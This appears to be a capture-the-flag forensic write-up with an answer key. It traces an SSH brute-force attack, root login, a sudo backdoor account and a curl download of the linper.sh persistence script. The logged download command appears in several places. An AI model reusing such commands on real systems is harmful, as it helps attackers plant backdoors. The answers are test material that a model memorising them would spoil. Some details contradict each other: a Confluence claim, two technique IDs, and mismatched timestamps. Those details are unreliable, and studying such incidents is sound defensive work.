# Sherlock Investigation Report

## I. Executive Summary

  * **Scenario Name:** \[Brutus]
  * **Case ID:** \[littlestarlight/2025-10-31]
  * **Final Conclusion:** A successful compromise was confirmed on the target system by the attacker **\[cyberjunkie/65.2.161.68]**. The attacker exploited a **\[Confluence server]** to achieve **\[privilege escalation, persistence, and execute certain commands]**.
  * **Key Evidence:** The definitive proof was found in the **\[auth.log]** and **\[wtmp]** showing an unauthorized login and script execution.

-----

## II. Chronological Timeline of Events

### Event 1: Brute-Force Attack

  * **Timestamp (UTC):** \[2024-03-06 06:31:31]
  * **Source File / Artifact:** \[`auth.log`]
  * **Event Description:** The server received a high volume of failed SSH/login authentication attempts.
  * **Analysis:** Confirmed **Brute-Force Attack** originating exclusively from `65.2.161.68`, targeting potentially high-level accounts \[`admin`, `server_adm`,`svc_account`,`root`].

### Event 2: Initial Access Gained (IPOC)

  * **Timestamp (UTC):** \[2024-03-06 06:32:45]
  * **Source File / Artifact:** \[`auth.log`, `wtmp`]
  * **Event Description:** A successful SSH/login session was established using the compromised account `root`. The session id assigned was `37`.
  * **Analysis:** **CRITICAL:** This marks the Initial Point of Compromise (IPOC). The attacker has achieved administrator-level control.

### Event 3: Persistence

  * **Timestamp (UTC):** \[2024-03-06 06:34:18]
  * **Source File / Artifact:** \[`auth.log`]
  * **Event Description:** A new account was created: `cyberjunkie`
  * **Analysis:** **Persistence/Defense Evasion** achieved by created a local account \[T1136.101] for future, covert access.

### Event 4: Privilege Maintenance

  * **Timestamp (UTC):** \[2024-03-06 06:35:15]
  * **Source File / Artifact:** \[`auth.log`]
  * **Event Description:** The new account `cyberjunkie` was added to administrator groups: \[group `sudo`] and \[shadow group `sudo`].
  * **Analysis:** **Credential Access/Defense Evasion** achieved by ensuring the stealth account maintains root-equivalent privileges (via `sudo`) for future sessions.

### Event 5: Tool Deployment

  * **Timestamp (UTC):** \[2024-03-06 06:39:38]
  * **Source File / Artifact:** \[`auth.log`]
  * **Event Description:** A command was executed to download the `linper.sh` script: `curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
  * **Analysis:** The attacker imported external tool `linper`, which is used to find vulnerabilities and misconfigurations, and to establish backdoors on a Linux machine.

-----

## III. Detailed Artifact Analysis

### A. Initial Access Vector and Attacker Identity

  * **Source File:** \[`auth.log`,`wtmp`]
  * **Relevant Snippet:**\
    \[`auth.log`]
    ```
    Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
    Mar  6 06:31:35 ip-172-31-35-28 sshd[2359]: Invalid user server_adm from 65.2.161.68 port 46596
    Mar  6 06:31:36 ip-172-31-35-28 sshd[2387]: Invalid user svc_account from 65.2.161.68 port 46742
    Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
    ```

    \[`wtmp`]
    ```
    "USER"	"2549"	"pts/1"	"ts/1"	"root"	"65.2.161.68"	"0"	"0"	"0"	"2024/03/06 14:32:45"	"387923"	"65.2.161.68"
    ```

  * **Attacker Identity (Source IP):**
    * The attack originated solely from **`65.2.161.68`**.
    * The single-source IP confirms a focused, automated **Brute-Force Attack**, rather than a distributed password spray.
  * **Target and Vulnerability:**
    * The target was the publicly exposed **SSH/login service**.
    * The attack targeted (potentially) high-level accounts: \[`admin`, `server_adm`,`svc_account`,`root`]
    * The attacker successfully gained access using `root` credentials at `2024/03/06 06:32:45` (Event 2), confirming the presence of a weak or default password on a critical account.

### B. Defense Evasion and Persistence Mechanisms

  * **Source File:** \[`auth.log`]
  * **Relevant Snippet:**\
    \[`auth.log` --- Account Creation]
    ```
    Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
    Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
    Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
    Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
    Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
    Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
    ```

    \[`auth.log` --- Privilege Maintenance]
    ```
    Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
    Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
    ```
  * **Mechanism 1: Account Creation**
    * The attacker, utilizing the existing **`root`** privileges, created a new, non-standard user account named **`cyberjunkie`** (Event 3) at **`06:34:18`**.
    * This is a form of **Defense Evasion** and **Persistence** (MITRE T1136.001), intended to provide a secondary, less-monitored backdoor.
  * **Mechanism 2: Privilege Maintenance:**
    * The attacker immediately added the `cyberjunkie` account to the **`sudo`** (administrator) group (Event 4) at **`06:35:15`**. After which, the user logs out from `root` at **`06:37:24`**.
    * This ensures that future logins via `cyberjunkie` will still possess **administrator-level privileges**, maintaining high-level access even if the primary `root` account is eventually locked or the password is changed.

### C. Tool Deployment and Reconnaissance

  * **Source File:** \[`auth.log`]
  * **Relevant Snippet:**
    ```
    Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
    ```
  * **External Tool Import:**
    * The attacker imported an external script, **`linper.sh`**, via `curl` (Event 5) at **`06:39:38`**.
  * **Tool Analysis (IOC):**
    * **`linper`** is a known script used for automated Linux system reconnaissance and privilege escalation checks.
    * By downloading this tool, the attacker was preparing to discover and seek further system weaknesses that could be exploited, solidifying long-term access and preparing for data theft/disruption.

-----

## IV. Answers to Challenge Questions

  * **Question 1: Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?**

      * **Answer:** `65.2.161.68`
      * **Reference:** See Event 1 and Section III.A.

  * **Question 2: The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?**

      * **Answer:** `root`
      * **Reference:** See Event 2 and Section III.A.

  * **Question 3: Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.**

      * **Answer:** `2024/03/06 06:32:45`
      * **Reference:** See Event 2 and Section III.A.

  * **Question 4: SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?**

      * **Answer:** `37`
      * **Reference:** See Event 2.

  * **Question 5: The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?**

      * **Answer:** `cyberjunkie`
      * **Reference:** See Event 3 and Section III.B.

  * **Question 6: What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?**

      * **Answer:** `T1136.001`
      * **Reference:** See Event 3 and Section III.B.

  * **Question 7: What time did the attacker's first SSH session end according to auth.log?**

      * **Answer:** `2024-03-06 06:37:24`
      * **Reference:** See Section III.B.

  * **Question 8: The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**

      * **Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

      * **Reference:** See Event 5 and Section III.C.
